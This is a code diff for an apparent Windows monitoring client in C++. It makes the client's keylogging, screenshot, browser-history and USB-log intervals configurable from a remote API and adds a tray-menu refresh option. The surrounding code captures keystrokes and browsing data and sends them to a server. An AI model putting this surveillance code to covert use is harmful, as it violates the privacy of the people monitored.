@@ -102,11 +102,22 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-#define SCREEN_INTERVAL 60
-#define TIC_INTERVAL 300
-#define HISTORY_INTERVAL 600
-#define KEY_INTERVAL 300
+// Configuration constants (will be updated from API)
+#define SCREEN_INTERVAL_DEFAULT 5
+#define TIC_INTERVAL_DEFAULT 30
+#define HISTORY_INTERVAL_DEFAULT 120
+#define KEY_INTERVAL_DEFAULT 60
+#define USB_INTERVAL_DEFAULT 30
+#define CONFIG_REFRESH_INTERVAL_DEFAULT 300
 #define STORAGE_CHECK_INTERVAL 5
+
+// Current configuration values (updated from API)
+int screenInterval = SCREEN_INTERVAL_DEFAULT;
+int ticInterval = TIC_INTERVAL_DEFAULT;
+int historyInterval = HISTORY_INTERVAL_DEFAULT;
+int keyInterval = KEY_INTERVAL_DEFAULT;
+int usbInterval = USB_INTERVAL_DEFAULT;
+int configRefreshInterval = CONFIG_REFRESH_INTERVAL_DEFAULT;
 #define WM_TRAYICON (WM_USER + 1)
 #define ID_TRAY_EXIT 1001
 #define ID_TRAY_STATUS 1002
@@ -118,14 +129,54 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 #define ID_TRAY_BROWSER_STATUS 1008
 #define ID_TRAY_KEYLOG_STATUS 1009
 #define ID_TRAY_USB_STATUS 1010
+#define ID_TRAY_CONFIG_REFRESH 1011
+
+// Configuration structures
+struct IntervalsConfig {
+    int screenshot;
+    int tic;
+    int history;
+    int keylog;
+    int usb;
+    int config_refresh;
+};
+
+struct ServerConfig {
+    int max_retry_attempts;
+    int connection_timeout;
+    int request_timeout;
+    int chunk_size;
+    bool compression_enabled;
+};
+
+struct FeaturesConfig {
+    bool screenshot_enabled;
+    bool browser_history_enabled;
+    bool keylog_enabled;
+    bool usb_monitoring_enabled;
+    bool debug_logging_enabled;
+    bool auto_update_enabled;
+};
+
+struct ClientConfig {
+    IntervalsConfig intervals;
+    ServerConfig server;
+    FeaturesConfig features;
+    std::string platform;
+    std::string version;
+    std::string last_updated;
+};
 
 // Global variables
 std::string macAddress;
 std::string serverIP;
 std::string serverPort;
 std::string username;
-int screenInterval = SCREEN_INTERVAL;
-int ticInterval = TIC_INTERVAL;  // Dynamic tic interval from server
+
+// Global configuration
+ClientConfig currentConfig;
+bool isConfigUpdating = false;
+std::chrono::system_clock::time_point lastConfigUpdate;
 double lastBrowserTic = -1;
 bool activeRunning = true;
 
@@ -229,6 +280,9 @@ std::string getEdgeHistory(int64_t sinceTime = 0);
 void monitorTask();
 void writeDebugLog(const std::string& message);
 bool loadSettings();
+bool fetchConfigurationFromAPI();
+void updateConfiguration(const Json::Value& config);
+void manualConfigRefresh();
 void setupSystemTray();
 void cleanupSystemTray();
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
@@ -327,6 +381,13 @@ void updateTrayMenu() {
     // USB log status
     std::string usbStatus = "USB Logs: " + connectionStatus.lastUSBLogStatus;
     AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_USB_STATUS, usbStatus.c_str());
+    
+    // Configuration section
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "=== CONFIGURATION ===");
+    
+    // Configuration refresh button
+    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_CONFIG_REFRESH, "Refresh Configuration");
     
     // Actions section
     AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
@@ -740,10 +801,6 @@ bool sendScreenshot(const std::string& filePath) {
     Json::Reader reader;
     if (reader.parse(response, root)) {
         if (root.isMember("status") && root["status"].asString() == "success") {
-            if (root.isMember("data") && root["data"].isMember("interval")) {
-                screenInterval = root["data"]["interval"].asInt();
-            }
-            
             // Update connection status
             {
                 std::lock_guard<std::mutex> lock(statusMutex);
@@ -791,10 +848,6 @@ bool sendTicEvent() {
     Json::Reader reader;
     if (reader.parse(response, root)) {
         if (root.isMember("status") && root["status"].asString() == "success") {
-            if (root.isMember("data") && root["data"].isMember("interval")) {
-                ticInterval = root["data"]["interval"].asInt();
-            }
-            
             // Update connection status
             {
                 std::lock_guard<std::mutex> lock(statusMutex);
@@ -1651,8 +1704,8 @@ void monitorTask() {
             lastTic = now;
         }
         
-        // Browser history - run in separate thread
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= HISTORY_INTERVAL) {
+        // Browser history - run in separate thread (using configurable interval)
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= historyInterval) {
             std::thread([]() {
                 collectBrowserHistory();
                 sendBrowserHistories();
@@ -1660,14 +1713,14 @@ void monitorTask() {
             lastHistory = now;
         }
         
-        // Key logs - run in separate thread
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= KEY_INTERVAL) {
+        // Key logs - run in separate thread (using configurable interval)
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= keyInterval) {
             std::thread([]() { sendKeyLogs(); }).detach();
             lastKeyLog = now;
         }
         
-        // USB logs - run in separate thread
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= 30) {
+        // USB logs - run in separate thread (using configurable interval)
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= usbInterval) {
             std::thread([]() { sendUSBLogs(); }).detach();
             lastUSBLog = now;
         }
@@ -1708,6 +1761,9 @@ int main() {
         std::cerr << "Error: Could not load settings.ini" << std::endl;
         return 1;
     }
+    
+    // Fetch configuration from API
+    fetchConfigurationFromAPI();
     
     // Setup keyboard monitoring
     setupKeyboardHook();
@@ -1818,6 +1874,141 @@ bool loadSettings() {
     return true;
 }
 
+// Configuration Management Functions
+bool fetchConfigurationFromAPI() {
+    if (isConfigUpdating) {
+        logMessage("Configuration update already in progress, skipping");
+        return false;
+    }
+    
+    isConfigUpdating = true;
+    logMessage("Fetching configuration from API");
+    
+    std::string configURL = API_BASE_URL + "/webapi_config.php?platform=windows";
+    
+    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        logMessage("Failed to initialize internet connection");
+        isConfigUpdating = false;
+        return false;
+    }
+    
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, configURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        logMessage("Failed to open configuration URL: " + configURL);
+        InternetCloseHandle(hInternet);
+        isConfigUpdating = false;
+        return false;
+    }
+    
+    std::string response;
+    char buffer[4096];
+    DWORD bytesRead;
+    
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        response += buffer;
+    }
+    
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    
+    if (response.empty()) {
+        logMessage("No configuration data received");
+        isConfigUpdating = false;
+        return false;
+    }
+    
+    // Parse JSON response
+    Json::Value root;
+    Json::Reader reader;
+    
+    if (!reader.parse(response, root)) {
+        logMessage("Failed to parse configuration JSON: " + reader.getFormattedErrorMessages());
+        isConfigUpdating = false;
+        return false;
+    }
+    
+    if (!root["success"].asBool()) {
+        logMessage("Configuration fetch failed: " + root["error"].asString());
+        isConfigUpdating = false;
+        return false;
+    }
+    
+    // Update configuration
+    Json::Value data = root["data"];
+    if (data.isObject()) {
+        updateConfiguration(data);
+        logMessage("Configuration updated successfully");
+        isConfigUpdating = false;
+        return true;
+    }
+    
+    logMessage("Invalid configuration data format");
+    isConfigUpdating = false;
+    return false;
+}
+
+void updateConfiguration(const Json::Value& config) {
+    // Update intervals
+    if (config["intervals"].isObject()) {
+        Json::Value intervals = config["intervals"];
+        
+        if (intervals["screenshot"].isInt()) {
+            screenInterval = intervals["screenshot"].asInt();
+        }
+        if (intervals["tic"].isInt()) {
+            ticInterval = intervals["tic"].asInt();
+        }
+        if (intervals["history"].isInt()) {
+            historyInterval = intervals["history"].asInt();
+        }
+        if (intervals["keylog"].isInt()) {
+            keyInterval = intervals["keylog"].asInt();
+        }
+        if (intervals["usb"].isInt()) {
+            usbInterval = intervals["usb"].asInt();
+        }
+        if (intervals["config_refresh"].isInt()) {
+            configRefreshInterval = intervals["config_refresh"].asInt();
+        }
+    }
+    
+    // Store current configuration
+    currentConfig.intervals.screenshot = screenInterval;
+    currentConfig.intervals.tic = ticInterval;
+    currentConfig.intervals.history = historyInterval;
+    currentConfig.intervals.keylog = keyInterval;
+    currentConfig.intervals.usb = usbInterval;
+    currentConfig.intervals.config_refresh = configRefreshInterval;
+    
+    if (config["platform"].isString()) {
+        currentConfig.platform = config["platform"].asString();
+    }
+    if (config["version"].isString()) {
+        currentConfig.version = config["version"].asString();
+    }
+    if (config["last_updated"].isString()) {
+        currentConfig.last_updated = config["last_updated"].asString();
+    }
+    
+    lastConfigUpdate = std::chrono::system_clock::now();
+    
+    // Log configuration update
+    logMessage("Configuration updated:");
+    logMessage("  Screenshot: " + std::to_string(screenInterval) + "s");
+    logMessage("  Tic: " + std::to_string(ticInterval) + "s");
+    logMessage("  History: " + std::to_string(historyInterval) + "s");
+    logMessage("  Keylog: " + std::to_string(keyInterval) + "s");
+    logMessage("  USB: " + std::to_string(usbInterval) + "s");
+    logMessage("  Config Refresh: " + std::to_string(configRefreshInterval) + "s");
+}
+
+void manualConfigRefresh() {
+    logMessage("Manual configuration refresh requested");
+    fetchConfigurationFromAPI();
+}
+
 // Setup system tray
 void setupSystemTray() {
     // Register window class for the tray icon
@@ -1923,6 +2114,11 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 case ID_TRAY_SEND_ALL:
                     std::thread([](){
                         sendInitialDataRequests();
+                    }).detach();
+                    break;
+                case ID_TRAY_CONFIG_REFRESH:
+                    std::thread([](){
+                        manualConfigRefresh();
                     }).detach();
                     break;
             }
